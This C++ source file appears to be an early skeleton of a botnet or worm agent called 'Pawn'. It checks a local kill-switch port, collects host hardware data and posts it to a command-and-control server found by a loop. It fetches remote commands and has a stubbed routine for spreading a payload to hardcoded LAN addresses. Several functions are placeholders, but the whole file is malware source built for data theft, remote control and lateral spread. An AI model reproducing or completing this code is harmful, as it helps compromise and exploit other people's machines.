//
// Created by nn5h on 7/23/19.
//

#include <unistd.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include "Pawn.h"



bool Pawn::sendMySelfData() {
    return mypost(CC, sdc.hwInfo);
}

bool Pawn::checkSWKill() {
    /* TEMPORARY
     * looking for parent
     * if it is, don't create clones */

    std::string url = "localhost:65501";
    auto resp = myget(url);

    return resp.status_code == 200;
}

//int Pawn::readPidFile(std::string fname) {
//    std::ifstream fs(fname);
//
//    if (fs.fail()) return -1;
//
//    std::string line;
//    fs >> line;
//    int gotPid = std::stoi(line);
//    printf("Got %d\n", gotPid);
//    fs.close();
//
//    return gotPid;
//
//}

bool Pawn::spread() {
    // iterate through LAN members & send payload
    for (auto i = LAN.begin(); i != LAN.end(); ++i){
        std::cout << "LAN member is" <<  *i << std::endl;
    }
    return true;
}

void Pawn::doWork() {
    for (int i = 0; i < 20; i++) {
        std::cout << i << " step" << std::endl;
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
}

Pawn::Pawn() {

    while (true) {
        if (!checkSWKill()) {
            gen = PRNG();
            sdc = SystemDataCollector();
            LAN = discoverLAN();

            connect2CC();

            std::cout << "trying to conSWKill disabled, I'm alive" << std::endl;

            // get command from CC
            std::string cccommand = getCommand();
            bool sendSystemDataResult = sendMySelfData();
            bool spreadResult = spread();
            doWork();
            std::cout << "gonna to sleep." << std::endl;
            sleep(10000);
        }

        // just for right now
        exit(1);
    }

}

Pawn::~Pawn() { }

std::vector<std::string> Pawn::discoverLAN() {
    std::vector<std::string> LANs;

    // DEBUG IT
    LANs.push_back("192.168.210.118");
    LANs.push_back("192.168.210.111");
    LANs.push_back("192.168.210.109");

    return LANs;
}

std::string Pawn::getCC(){
    std::cout << "gen: " << gen.generate() << std::endl;

    return "127.0.0.1:13131";

}

void Pawn::connect2CC() {
    std::map<std::string, std::string> dataQuickCheck;
    dataQuickCheck.insert(std::pair<std::string, std::string>("world", "1111"));

    while (true) {
        std::string possibleCC = getCC();
        std::cout << "check CC : " << possibleCC << " ... " << std::endl;

        // some check CC here ... => CCisCC = 1/0
        bool CCisCC = true;
        int checkCCConnect = mypost(possibleCC + "/hello", dataQuickCheck);

        if (CCisCC && (bool)checkCCConnect) {
            // CC is found
            // get command && 'sleep'
            CC = possibleCC;
            break;
        }
    }
}

bool Pawn::sendData2IP() {
    return true;
}

void Pawn::preventKill() {
    // monitor sent signals
}

std::string Pawn::getCommand() {
    cpr::Response possibleCommand;
    possibleCommand = myget(CC + "/getCommand");

    return possibleCommand.text;
}